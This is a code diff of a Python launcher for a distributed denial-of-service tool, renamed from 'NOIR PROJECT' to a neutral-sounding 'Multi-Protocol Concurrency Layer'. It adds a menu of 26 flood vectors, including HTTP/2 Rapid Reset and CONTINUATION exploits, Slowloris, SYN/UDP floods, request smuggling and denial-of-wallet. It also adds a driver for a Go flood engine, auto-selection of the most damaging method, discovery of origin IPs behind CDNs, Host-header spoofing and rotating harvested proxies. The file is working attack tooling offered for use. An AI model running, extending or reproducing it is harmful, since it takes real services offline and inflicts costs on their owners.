@@ -6,20 +6,40 @@ import argparse
 import asyncio
 import logging
 import time
-import socket
+import subprocess
+import signal
+import psutil
+import threading
 from datetime import datetime
+from typing import Optional, Dict, List
+from urllib.parse import urlparse
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-logger = logging.getLogger("noir")
+# Logger goes to file only - keeps stdout clean for dashboard
+os.makedirs("logs", exist_ok=True)
+_LOG_FILE = f"logs/mpc_layer_{datetime.now():%Y%m%d}.log"
+logging.basicConfig(
+    level=logging.WARNING,
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
+    handlers=[logging.FileHandler(_LOG_FILE, encoding="utf-8")],
+    force=True,
+)
+# Silence noisy submodules during dashboard
+for _name in ("enhanced_attack", "attack_engine", "proxy_engine", "target_detector",
+              "origin_hunter", "proxy_harvester", "mpc_layer"):
+    logging.getLogger(_name).setLevel(logging.ERROR)
+
+logger = logging.getLogger("mpc_layer")
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 VERSION = "5.0"
+GO_ENGINE = "bin/go_engine.exe"
+RAPID_RESET_BIN = "bin/rapid_reset.exe"
 
 def load_config(path: str = "config/default.yaml") -> dict:
     d = {
         "proxy": {"connect_timeout": 3, "min_pool": 5, "health_check_interval": 60, "max_fail": 3},
-        "attack": {"default_duration": 3600, "default_method": "http_get_flood", "max_rps": 1000, "min_rps": 10, "initial_rps": 100},
+        "attack": {"default_duration": 300, "default_method": "http_get_flood", "max_rps": 10000, "min_rps": 10, "initial_rps": 1000},
     }
     try:
         with open(path) as f:
@@ -29,7 +49,6 @@ def load_config(path: str = "config/default.yaml") -> dict:
     except Exception:
         pass
     return d
-
 
 def load_env(path: str = ".env") -> dict:
     env = {}
@@ -44,7 +63,6 @@ def load_env(path: str = ".env") -> dict:
         pass
     return env
 
-
 def _merge(b: dict, o: dict):
     for k, v in o.items():
         if k in b and isinstance(b[k], dict) and isinstance(v, dict):
@@ -52,32 +70,56 @@ def _merge(b: dict, o: dict):
         else:
             b[k] = v
 
-
 def c(t, s):
     codes = {"g": "32", "r": "31", "y": "33", "c": "36", "w": "37", "m": "35", "d": "90"}
     return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"
 
-
 def banner():
     print()
     print(c("w", "=" * 70))
-    print(f"  {c('w','NOIR')} {c('r','PROJECT')} | {c('d','TOTAL RECALL ENGINE v' + VERSION + ' [2026]')}")
+    print(f"  {c('w','Multi-Protocol Concurrency Layer')} {c('d','v' + VERSION + ' [2026]')}")
+    print(f"  {c('d','Asynchronous Attack Vector Engine | Transport Layer Optimization')}")
     print(c("w", "=" * 70))
     print()
 
-
 def menu():
     banner()
-    print(f"  {c('c','[1]')} SEO Scan          - Scan endpoints, CMS, WAF, sitemap")
-    print(f"  {c('c','[2]')} Attack Direct     - No proxy, single IP flood")
-    print(f"  {c('c','[3]')} Attack Proxy      - Rotate proxy pool (bypass rate limit)")
-    print(f"  {c('c','[4]')} Attack Origin IP  - Hit origin server directly")
-    print(f"  {c('c','[5]')} Test Proxies      - Validate proxy list against target")
-    print(f"  {c('c','[6]')} Find Origin IP    - Discover origin IP behind CDN")
-    print(f"  {c('r','[7]')} SEO BACKHEART     - Advanced SEO audit & monitoring")
-    print(f"  {c('c','[0]')} Exit")
+    print(f"  {c('c','[1]')} HTTP Flood      {c('d','Layer 7 smart endpoint flood')}")
+    print(f"  {c('c','[2]')} HTTP/2 Flood    {c('d','HTTP/2 multiplexing attack')}")
+    print(f"  {c('c','[3]')} Rapid Reset     {c('d','CVE-2023-44487 stream reset')}")
+    print(f"  {c('c','[4]')} Slowloris       {c('d','Slow header exhaustion')}")
+    print(f"  {c('c','[5]')} Proxy Flood     {c('d','Rotating proxy attack')}")
+    print(f"  {c('c','[6]')} SYN Flood       {c('d','Layer 4 TCP SYN flood')}")
+    print(f"  {c('c','[7]')} UDP Flood       {c('d','Layer 4 UDP flood')}")
     print()
-
+    print(f"  {c('m','[A]')} Cache-Bypass    {c('d','Hit origin, skip CDN cache')}")
+    print(f"  {c('m','[B]')} Smuggling       {c('d','HTTP request smuggling')}")
+    print(f"  {c('m','[C]')} HPACK Bomb      {c('d','HTTP/2 header compression')}")
+    print(f"  {c('m','[D]')} Continuation    {c('d','CVE-2024-27316 H2 flood')}")
+    print(f"  {c('m','[E]')} Settings        {c('d','HTTP/2 settings spam')}")
+    print(f"  {c('m','[F]')} TLS Reneg       {c('d','TLS renegotiation burn')}")
+    print(f"  {c('m','[G]')} POST Bomb       {c('d','50MB multipart upload')}")
+    print(f"  {c('m','[I]')} WebSocket       {c('d','WS connection storm')}")
+    print(f"  {c('m','[J]')} Conn Storm      {c('d','TCP connection hold')}")
+    print()
+    print(f"  {c('r','[Q]')} HTTP/3 Hijack   {c('d','QUIC stream manipulation')}")
+    print(f"  {c('r','[R]')} QUIC CID        {c('d','Connection ID table flood')}")
+    print(f"  {c('r','[S]')} QUIC Crypto     {c('d','Handshake CPU exhaustion')}")
+    print()
+    print(f"  {c('b','[T]')} REST API        {c('d','CRUD endpoint flood')}")
+    print(f"  {c('b','[U]')} GraphQL         {c('d','Deep nested query bomb')}")
+    print(f"  {c('b','[V]')} GraphQL Alias   {c('d','200-alias query bomb')}")
+    print(f"  {c('b','[W]')} gRPC            {c('d','HTTP/2 gRPC flood')}")
+    print(f"  {c('b','[X]')} JSON/XML        {c('d','Parsing bomb attack')}")
+    print(f"  {c('b','[Y]')} Cold Start      {c('d','Serverless auto-scale')}")
+    print(f"  {c('b','[Z]')} Cost Acc        {c('d','Denial of Wallet')}")
+    print()
+    print(f"  {c('g','[8]')} Mixed Attack    {c('d','ALL 26 vectors parallel')}")
+    print(f"  {c('g','[9]')} Auto Mode       {c('d','5-phase adaptive attack')}")
+    print(f"  {c('g','[H]')} Origin Hunt     {c('d','Find IP behind CDN')}")
+    print(f"  {c('g','[P]')} Harvest Proxy   {c('d','Auto-scrape 24k+ proxies')}")
+    print(f"  {c('c','[0]')} Dashboard       {c('d','Web monitoring panel')}")
+    print()
 
 def get_input(prompt: str) -> str:
     try:
@@ -85,515 +127,2358 @@ def get_input(prompt: str) -> str:
     except (EOFError, KeyboardInterrupt):
         return ""
 
+def build_go_args(target: str, duration: int, rps: int, method: str, threads: int = 0,
+                  proxy_file: str = "", http2: bool = False, rapid_reset: bool = False,
+                  origin_ip: str = "") -> List[str]:
+    args = [
+        GO_ENGINE,
+        "-target", target,
+        "-duration", str(duration),
+        "-rps", str(rps),
+        "-method", method,
+    ]
+    if threads > 0:
+        args.extend(["-threads", str(threads)])
+    if proxy_file:
+        args.extend(["-proxy-file", proxy_file])
+    if http2:
+        args.append("-http2")
+    if rapid_reset:
+        args.append("-rapid-reset")
+    if origin_ip:
+        args.extend(["-origin", origin_ip])
+    return args
 
-async def run_scan(target: str, cfg: dict):
-    if not target.startswith(("http://", "https://")):
-        target = "https://" + target
-    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
-    print(f" {c('c','[*]')} Starting SEO scan...\n")
+async def run_go_engine(target: str, duration: int, rps: int, method: str = "http-flood",
+                        threads: int = 0, proxy_file: str = "", http2: bool = False,
+                        rapid_reset: bool = False, origin_ip: str = "",
+                        live_stats: dict = None) -> Dict:
+    """
+    Run Go engine. If live_stats dict is provided, updates it in real-time
+    with parsed [STATS] lines from Go output. Returns final result dict.
+    """
+    if not os.path.exists(GO_ENGINE):
+        print(f" {c('r','[-]')} Go engine not found: {GO_ENGINE}")
+        if live_stats is not None:
+            live_stats["status"] = "error"
+        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": 0}
 
-    from core.intel_engine import TargetAnalyzer
-    ta = TargetAnalyzer()
-    prof = ta.analyze(target)
-    print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
-    if prof.is_behind_cdn:
-        print(f" {c('y','[!]')} Behind CDN: Yes")
-        if prof.origin_ips:
-            print(f" {c('y','[!]')} Origin IP candidates: {prof.origin_ips[:5]}")
-    else:
-        print(f" {c('g','[+]')} Behind CDN: No")
+    args = build_go_args(target, duration, rps, method, threads, proxy_file, http2, rapid_reset, origin_ip)
 
-    from core.endpoint_engine import SmartEndpointDiscovery
-    sd = SmartEndpointDiscovery()
-    endps = await sd.probe(target)
-    plan = sd.generate_attack_plan()
+    if live_stats is None:
+        # Legacy mode - print starting message
+        print(f" {c('c','[*]')} Starting Go engine: {' '.join(args)}")
 
-    print(f"\n {c('c','='*70)}")
-    print(f" {c('w','  SEO SCAN REPORT')}")
-    print(f" {c('c','='*70)}")
-    print(f"  Target:     {target}")
-    print(f"  Endpoints:  {len(endps)}")
-    print(f"  Vectors:    {len(plan)}")
-    print(f" {c('d','-'*70)}")
-    for ep in endps:
-        tag = c('g','200 OK') if ep.status == 200 else (c('y',str(ep.status)) if ep.status else c('r','ERR'))
-        print(f"  {tag}  {ep.method:6s} {ep.path:40s} {ep.body_len:>6}b")
-    print(f" {c('d','-'*70)}")
-    ok_count = sum(1 for e in endps if e.status == 200)
-    block_count = sum(1 for e in endps if e.blocked)
-    print(f"  Accessible:  {ok_count}/{len(endps)}")
-    print(f"  Blocked:     {block_count}/{len(endps)}")
-    print(f"  Sitemap:     {'/sitemap.xml' if any(e.path=='/sitemap.xml' and e.status==200 for e in endps) else 'Not found'}")
-    print(f"  Robots:      {'/robots.txt' if any(e.path=='/robots.txt' and e.status==200 for e in endps) else 'Not found'}")
-    wp = [e for e in endps if 'wp-' in e.path.lower()]
-    print(f"  WordPress:   {len(wp)} paths detected")
-    print(f" {c('c','='*70)}\n")
+    start = time.time()
 
+    if live_stats is not None:
+        live_stats["status"] = "running"
+        live_stats["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
 
-async def run_attack(target: str, cfg: dict, no_proxy: bool, origin_ip: str, proxy_pool=None, health_task=None, env=None):
-    if not target.startswith(("http://", "https://")):
-        target = "https://" + target
-
-    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
-
-    if origin_ip == "auto":
-        from core.intel_engine import TargetAnalyzer
-        from core.origin_finder import OriginFinder
-        print(f" {c('c','[*]')} Auto-discovering origin IP...")
-        ta = TargetAnalyzer()
-        prof = ta.analyze(target)
-        print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
-
-        if prof.is_behind_cdn:
-            print(f" {c('y','[*]')} Running advanced origin discovery...")
-            env = env or load_env()
-            finder = OriginFinder()
-            report = finder.find_origin(
-                target,
-                censys_id=env.get("CENSYS_ID") or None,
-                censys_secret=env.get("CENSYS_SECRET") or None,
-                shodan_key=env.get("SHODAN_KEY") or None,
-                securitytrails_key=env.get("SECURITYTRAILS_KEY") or None,
-                zoomeye_key=env.get("ZOOMEYE_KEY") or None,
-                netlas_key=env.get("NETLAS_KEY") or None,
-            )
-            if report.verified_origin:
-                origin_ip = report.verified_origin
-                print(f" {c('g','[+]')} VERIFIED ORIGIN IP: {origin_ip}")
-            elif report.candidates:
-                origin_ip = report.candidates[0].ip
-                print(f" {c('y','[!]')} Most likely origin: {origin_ip} ({report.candidates[0].confidence:.0%})")
-                if len(report.candidates) > 1:
-                    print(f" {c('y','[!]')} Other candidates: {[c.ip for c in report.candidates[1:5]]}")
-            else:
-                origin_ip = prof.origin_ips[0] if prof.origin_ips else None
-                print(f" {c('r','[-]')} No advanced results, using basic discovery")
-        elif not prof.is_behind_cdn:
-            origin_ip = None
-            print(f" {c('g','[+]')} No CDN detected, using direct mode.")
-
-    if proxy_pool:
-        proxy_pool._validator.set_target(target)
-        alive_path = "proxies/alive.txt"
-        if os.path.exists(alive_path):
-            total = await proxy_pool.load_file(alive_path)
-            if total == 0:
-                print(f" {c('r','[-]')} alive.txt is empty. Run menu 5 first.")
-                return
-            print(f" {c('g','[+]')} Loaded {total} alive proxies from {alive_path}")
-        else:
-            total = 0
-            for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
-                total += await proxy_pool.load_file(f)
-            if total == 0:
-                print(f" {c('r','[-]')} No proxies loaded.")
-                return
-            print(f" {c('c','[*]')} Validating ALL {total} proxies against target...")
-            alive = await proxy_pool.quick_validate(total, concurrency=100)
-            if alive == 0:
-                print(f" {c('r','[-]')} No valid proxies for this target.")
-                return
-            proxy_pool.save_alive(alive_path)
-            print(f" {c('g','[+]')} {alive} proxies ready. Saved to {alive_path}")
-        health_task = asyncio.create_task(proxy_pool.health_loop())
-
-    print(f" {c('c','[*]')} Smart endpoint discovery...")
-    from core.endpoint_engine import SmartEndpointDiscovery
-    sd = SmartEndpointDiscovery()
-    endps = await sd.probe(target)
-    attack_plan = sd.generate_attack_plan()
-    print(f" {c('g','[+]')} {len(endps)} endpoints, {len(attack_plan)} vectors")
-
-    start_tier = 3 if origin_ip else (1 if no_proxy else 2)
-    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
-    rps = int(get_input(" Target RPS (default 1000): ") or "1000")
-
-    from core.attack_engine import AttackEngine
-    engine = AttackEngine(
-        proxy_pool=proxy_pool if not no_proxy else None,
-        no_proxy=no_proxy or bool(origin_ip),
-        origin_ip=origin_ip,
-        proxy_type="datacenter",
-        initial_rps=rps,
-        start_tier=start_tier,
-        attack_plan=attack_plan,
+    import re
+    stats_re = re.compile(
+        r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?in_flight=(\d+).*?rps=([\d.]+)"
     )
 
-    method = cfg["attack"]["default_method"]
-    engine_choice = get_input(" Engine: [1] Legacy [2] Enhanced [3] v6 2026 (default 3): ").strip()
-    use_v6 = engine_choice == "3" or engine_choice == ""
-    use_enhanced = engine_choice == "2"
-    
-    if use_v6:
-        print(f"\n {c('c','[*]')} v6 2026 Engine: {method} | Duration: {duration}s | RPS: {rps}")
-        print(f" {c('c','[*]')} Features: JA4 spoofing, HTTP/2, Smart Session, Adaptive, Polymorphic")
-        print(f" {c('m','=' * 70)}")
-        
-        from engines.enhanced_v6 import run_v6_attack
-        proxy_url = None
-        if proxy_pool and not no_proxy:
-            ps = await proxy_pool.get_proxy("datacenter")
-            proxy_url = ps.url if ps else None
-        
-        result = await run_v6_attack(
-            url=target,
-            duration=duration,
-            method=method,
-            rps=rps,
-            proxy=proxy_url,
-            proxy_pool=proxy_pool if not no_proxy else None,
-            proxy_type="datacenter",
-            origin_ip=origin_ip,
-            adaptive=True,
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *args,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
         )
-        
-        elapsed = duration
-        tot = result["total"]
-        ok = result["completed"]
-        fail = result["failed"]
-        to = result["timeout"]
-        adaptive_status = result.get("adaptive_status", {})
-        
-        print()
-        print(c("w", "=" * 70))
-        print(c("w", "  NOIR PROJECT v6.0 | Attack Summary"))
-        print(c("w", "=" * 70))
-        print(f"  Target:          {target}")
-        print(f"  Duration:        {duration}s")
-        print(f"  Total Requests:  {tot}")
-        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
-        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
-        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
-        print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
-        if adaptive_status:
-            print(f"  {c('c','Adaptive:')}       {adaptive_status.get('state', 'unknown')} | Strategy: {adaptive_status.get('strategy', 'unknown')}")
-        print(c("w", "=" * 70))
-        return
-    elif use_enhanced:
-        print(f"\n {c('c','[*]')} Enhanced Engine: {method} | Duration: {duration}s | RPS: {rps}")
-        print(f" {c('m','=' * 70)}")
-        
-        from core.enhanced_attack import run_enhanced_attack
-        proxy_url = None
-        if proxy_pool and not no_proxy:
-            ps = await proxy_pool.get_proxy("datacenter")
-            proxy_url = ps.url if ps else None
-        
-        result = await run_enhanced_attack(
-            url=target,
-            duration=duration,
-            method=method,
-            rps=rps,
-            proxy=proxy_url,
-            proxy_pool=proxy_pool if not no_proxy else None,
-            proxy_type="datacenter",
-            origin_ip=origin_ip,
-        )
-        
-        elapsed = duration
-        tot = result["total"]
-        ok = result["completed"]
-        fail = result["failed"]
-        to = result["timeout"]
-        
-        print()
-        print(c("w", "=" * 70))
-        print(c("w", "  NOIR PROJECT | Enhanced Attack Summary"))
-        print(c("w", "=" * 70))
-        print(f"  Target:          {target}")
-        print(f"  Duration:        {duration}s")
-        print(f"  Total Requests:  {tot}")
-        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
-        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
-        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
-        print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
-        print(c("w", "=" * 70))
-        return
-    else:
-        print(f"\n {c('c','[*]')} Tier: {start_tier} | Method: {method} | Duration: {duration}s | RPS: {rps}")
-        print(f" {c('m','=' * 70)}")
 
-        start = time.time()
-        attack = asyncio.create_task(engine.start_attack(target, duration, method, rps))
-        hb = asyncio.create_task(heartbeat(engine, duration))
-        await attack
-        await hb
+        final_result = {"total_requests": 0, "completed": 0, "failed": 0,
+                        "timeout": 0, "elapsed": 0}
+
+        async def read_stream(stream):
+            try:
+                while True:
+                    line = await stream.readline()
+                    if not line:
+                        break
+                    text = line.decode(errors="replace").strip()
+                    if not text:
+                        continue
+
+                    # Parse [STATS] lines for live updates
+                    m = stats_re.search(text)
+                    if m and live_stats is not None:
+                        ok = int(m.group(1))
+                        fail = int(m.group(2))
+                        in_flight = int(m.group(3))
+                        rps_val = float(m.group(4))
+                        live_stats["stats"] = {
+                            "total_requests": ok + fail,
+                            "completed": ok,
+                            "failed": fail,
+                            "timeout": 0,
+                            "in_flight": in_flight,
+                            "current_rps": rps_val,
+                        }
+                        continue
+
+                    # Parse final JSON result
+                    if text.startswith("{") and "completed" in text:
+                        try:
+                            parsed = json.loads(text)
+                            final_result["total_requests"] = parsed.get("total_requests", 0)
+                            final_result["completed"] = parsed.get("completed", 0)
+                            final_result["failed"] = parsed.get("failed", 0)
+                            final_result["timeout"] = parsed.get("timeout", 0)
+                            final_result["elapsed"] = parsed.get("elapsed_seconds", 0)
+                            final_result["peak_rps"] = parsed.get("peak_rps", 0)
+                            if live_stats is not None:
+                                live_stats["stats"] = final_result
+                        except json.JSONDecodeError as e:
+                            logger.debug(f"JSON parse error: {e}")
+                            pass
+            except asyncio.CancelledError:
+                pass
+            except Exception as e:
+                logger.error(f"Stream read error: {type(e).__name__}: {e}")
+                pass
+
+        try:
+            await asyncio.wait_for(
+                asyncio.gather(
+                    read_stream(proc.stdout),
+                    read_stream(proc.stderr),
+                    return_exceptions=True,
+                ),
+                timeout=duration + 30,
+            )
+        except asyncio.TimeoutError:
+            logger.warning(f"Go engine timeout after {duration + 30}s")
+            try:
+                proc.kill()
+            except Exception as e:
+                logger.debug(f"Kill process error: {e}")
+                pass
+        except asyncio.CancelledError:
+            logger.info("Go engine cancelled by user")
+            try:
+                proc.kill()
+            except Exception:
+                pass
+            if live_stats is not None:
+                live_stats["status"] = "error"
+            return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}
+
+        await proc.wait()
 
         elapsed = time.time() - start
-        m = engine.get_metrics()
-        tot, ok, fail, to = m["total_requests"], m["completed"], m["failed"], m["timeout"]
+        if final_result["elapsed"] == 0:
+            final_result["elapsed"] = elapsed
 
-        print()
-        print(c("w", "=" * 70))
-        print(c("w", "  NOIR PROJECT | Attack Summary"))
-        print(c("w", "=" * 70))
-        print(f"  Target:          {target}")
-        print(f"  Duration:        {int(elapsed//60)}m {int(elapsed%60)}s")
-        print(f"  Total Requests:  {tot}")
-        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
-        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
-        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
-        print(f"  Peak RPS:        {m['peak_rps']:.1f}")
-        print(f"  Avg RTT:         {m['avg_response_time_ms']:.0f}ms")
-        print(f"  Tier:            {m['tier']}")
-        print(f"  Method:          {method}")
-        print(c("w", "=" * 70))
+        if live_stats is not None:
+            live_stats["status"] = "done" if final_result["completed"] > 0 else "error"
+            live_stats["stats"] = final_result
 
-        os.makedirs("logs", exist_ok=True)
-        log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
+        return final_result
+
+    except FileNotFoundError:
+        error_msg = f"Go engine not found: {GO_ENGINE}"
+        logger.error(error_msg)
+        print(f" {c('r','[-]')} {error_msg}")
+        if live_stats is not None:
+            live_stats["status"] = "error"
+        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}
+    except Exception as e:
+        error_msg = f"Go engine error: {type(e).__name__}: {e}"
+        logger.error(error_msg)
+        print(f" {c('r','[-]')} {error_msg}")
+        if live_stats is not None:
+            live_stats["status"] = "error"
+        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}
+
+async def auto_detect_target(target: str, verbose: bool = True):
+    """Auto-detect target capabilities and recommend optimal attack method"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    if verbose:
+        print(f" {c('c','[*]')} Auto-detecting target capabilities...")
+
+    try:
+        from core.recon.detector import TargetDetector, print_profile
+        detector = TargetDetector(timeout=10)
+        profile = await detector.probe(target)
+
+        if verbose:
+            print_profile(profile, color_func=c)
+
+        return profile
+    except Exception as e:
+        print(f" {c('y','[!]')} Auto-detect failed: {e} - falling back to manual mode")
+        return None
+
+async def smart_layer7_attack(target: str, duration: int, rps: int,
+                              user_method: str = "auto", proxy_file: str = "",
+                              cfg: dict = None):
+    """Smart Layer 7 attack with auto-detection and method switching"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    profile = await auto_detect_target(target, verbose=True)
+
+    if profile is None:
+        method = user_method if user_method != "auto" else "http-flood"
+        print(f" {c('y','[!]')} No detection - using {method}")
+        return await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="http-flood", rapid_reset=(method == "rapid-reset")
+        )
+
+    # Auto-pick method based on profile
+    use_rapid_reset = profile.needs_rapid_reset
+    use_http2 = profile.supports_http2
+    use_proxy = profile.needs_proxy
+
+    if user_method == "auto":
+        chosen_method = profile.recommended_method
+        chosen_strategy = profile.recommended_strategy
+    else:
+        chosen_method = user_method
+        chosen_strategy = user_method
+        # Force rapid-reset if HTTP/2 detected and user picked http-flood
+        if user_method in ("http-flood", "http2-flood") and use_rapid_reset:
+            print(f" {c('g','[+]')} HTTP/2 detected - upgrading to RAPID RESET (more effective)")
+            chosen_method = "rapid-reset"
+            use_rapid_reset = True
+
+    print(f" {c('g','[+]')} Final attack plan: method={c('w',chosen_method)} strategy={c('w',chosen_strategy)}")
+    print(f" {c('m','=' * 70)}")
+
+    proxy_pool = None
+    if use_proxy and proxy_file:
+        from core.network.proxy import ProxyPool
+        proxy_pool = ProxyPool(connect_timeout=5, min_pool=5)
+        total = await proxy_pool.load_file(proxy_file)
+        if total > 0:
+            proxy_pool._validator.set_target(target)
+            alive = await proxy_pool.quick_validate(total, concurrency=40)
+            print(f" {c('g','[+]')} Proxy pool: {alive}/{total} alive")
+
+    if chosen_method == "rapid-reset" or use_rapid_reset:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="http-flood", rapid_reset=True
+        )
+    elif chosen_method in ("http2-flood",) or use_http2:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="http-flood", http2=True
+        )
+    elif chosen_method == "proxy-flood":
+        from core.attack.enhanced import run_enhanced_attack
+        result = await run_enhanced_attack(
+            url=target, duration=duration, method="http_get_flood",
+            rps=rps, proxy_pool=proxy_pool
+        )
+    else:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="http-flood"
+        )
+
+    return result
+
+async def prompt_target_type(target: str) -> dict:
+    """
+    Ask user about target type so we know how to handle it.
+    Returns: {target_url, origin_ip, target_type, host_header}
+    """
+    from core.recon.origin_store import is_ip_address
+
+    if not target.startswith(("http://", "https://")):
+        # raw input - might be IP, domain, or URL fragment
+        if is_ip_address(target.split("/")[0].split(":")[0]):
+            target = "https://" + target
+        else:
+            target = "https://" + target
+
+    parsed = urlparse(target)
+    host = (parsed.hostname or "").split(":")[0]
+
+    info = {
+        "target_url": target,
+        "origin_ip": "",
+        "target_type": "url",
+        "host_header": parsed.hostname,
+    }
+
+    if is_ip_address(host):
+        # Target is bare IP
+        print(f" {c('y','[*]')} Target appears to be bare IP: {c('w', host)}")
+        print(f"   {c('c','1.')} This IS the origin server (use directly, no Host spoofing)")
+        print(f"   {c('c','2.')} This is origin IP, but pretend to be a different domain (Host spoofing)")
+        choice = get_input(" Choose [1/2] (default 1): ").strip() or "1"
+
+        if choice == "2":
+            domain = get_input(" Domain to spoof in Host header (e.g. target.com): ").strip()
+            if domain:
+                info["target_type"] = "ip_with_host_spoof"
+                info["origin_ip"] = host
+                info["host_header"] = domain
+                info["target_url"] = f"{parsed.scheme}://{domain}{parsed.path or ''}"
+                print(f" {c('g','[+]')} Will hit {host}, pretend Host: {domain}")
+        else:
+            info["target_type"] = "bare_ip"
+            info["origin_ip"] = ""
+            print(f" {c('g','[+]')} Direct mode - hitting {host}")
+    else:
+        # Domain/URL - ask if user wants to use known origin
+        print(f" {c('c','[*]')} Target type: domain/URL ({host})")
+
+    return info
+
+
+async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin: bool = True):
+    """
+    Common interactive prompt for attack options.
+    Returns dict with: origin_ip, proxy_pool, proxy_file, target_url, host_header
+    """
+    options = {"origin_ip": "", "proxy_pool": None, "proxy_file": "",
+               "target_url": target, "host_header": ""}
+
+    # First: figure out target type
+    target_info = await prompt_target_type(target)
+    options.update(target_info)
+    target = options["target_url"]
+
+    # Origin handling - only for non-IP targets
+    if ask_origin and options["target_type"] == "url":
         try:
-            with open(log, "w") as f:
-                json.dump({"target": target, "metrics": m}, f, indent=2)
-            print(f" {c('g','[+]')} Log: {log}")
+            from core.recon.origin_store import load_hunt, get_best_origin
+            saved = load_hunt(target)
+            if saved and (saved.get("verified_origins") or saved.get("candidates")):
+                best = get_best_origin(target)
+                if best:
+                    print(f" {c('g','[+]')} Found saved origin: {c('w', best)}")
+                    if get_input(f"   Use saved origin for bypass? (Y/n): ").lower() != "n":
+                        options["origin_ip"] = best
+            if not options["origin_ip"]:
+                if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
+                    from core.recon.origin_hunter import OriginHunter
+                    env = load_env()
+                    print(f" {c('c','[*]')} Hunting origin IP...")
+                    hunter = OriginHunter(timeout=8)
+                    report = await hunter.hunt(target, env=env)
+                    if report.verified_origins:
+                        options["origin_ip"] = report.verified_origins[0]
+                        print(f" {c('g','[+]')} Origin found: {options['origin_ip']}")
+                    elif report.candidates:
+                        options["origin_ip"] = report.candidates[0].ip
+                        print(f" {c('y','[*]')} Best candidate: {options['origin_ip']}")
+                    else:
+                        print(f" {c('y','[!]')} No origin found - hitting target directly")
+        except Exception as e:
+            logger.debug(f"Origin handling failed: {e}")
+
+    # Proxy handling - for ATTACK traffic only
+    if ask_proxy:
+        # Discover proxy files first - smart default
+        proxy_files = []
+        if os.path.isdir("proxies"):
+            proxy_files = sorted([
+                f"proxies/{f}" for f in os.listdir("proxies")
+                if f.endswith(".txt") and not f.startswith(".")
+            ])
+
+        smart_default = "1" if proxy_files else "3"
+
+        print(f"\n {c('c','[*]')} Proxy for ATTACK traffic (not for recon):")
+        print(f"   {c('c','1.')} Use existing proxy file(s)" + (f" {c('g','['+str(len(proxy_files))+' files found]')}" if proxy_files else ""))
+        print(f"   {c('c','2.')} Auto-harvest fresh proxies first")
+        print(f"   {c('c','3.')} No proxies (direct attack)")
+        proxy_choice = get_input(f" Choose [1/2/3] (default {smart_default}): ").strip() or smart_default
+
+        if proxy_choice == "1":
+            if proxy_files:
+                print(f"\n {c('c','[*]')} Available proxy files in proxies/:")
+                for i, pf in enumerate(proxy_files, 1):
+                    try:
+                        line_count = sum(1 for line in open(pf) if line.strip() and not line.startswith("#"))
+                        print(f"   {c('c', '['+str(i)+']')} {pf} ({line_count} entries)")
+                    except Exception:
+                        print(f"   {c('c', '['+str(i)+']')} {pf}")
+                print(f"   {c('c','[A]')} Use ALL files merged")
+                print(f"   {c('c','[M]')} Manual file path")
+
+                sel = get_input(" Choose [number/A/M] (default A): ").strip().upper() or "A"
+
+                files_to_load = []
+                if sel == "A":
+                    files_to_load = proxy_files
+                elif sel == "M":
+                    manual = get_input(" Proxy file path: ").strip()
+                    if manual and os.path.exists(manual):
+                        files_to_load = [manual]
+                else:
+                    try:
+                        idx = int(sel) - 1
+                        if 0 <= idx < len(proxy_files):
+                            files_to_load = [proxy_files[idx]]
+                    except ValueError:
+                        pass
+
+                if files_to_load:
+                    from core.network.proxy import ProxyPool
+                    pool = ProxyPool(connect_timeout=5)
+                    total = 0
+                    for f in files_to_load:
+                        with open(f, "r") as fp:
+                            count = await pool.load(fp.readlines())
+                            total += count
+                            print(f" {c('g','[+]')} {f}: loaded {count} proxies")
+                    print(f" {c('g','[+]')} Total: {total} unique proxies")
+
+                    # Ask if user wants to validate before use
+                    if get_input(" Validate proxies before use? (Y/n): ").lower() != "n":
+                        # Set check URL based on whether we have auth proxies
+                        has_auth = any(ps.url.count("@") > 0 for ps in pool._pending)
+
+                        if has_auth:
+                            pool._validator.check_url = "https://ipv4.webshare.io/"
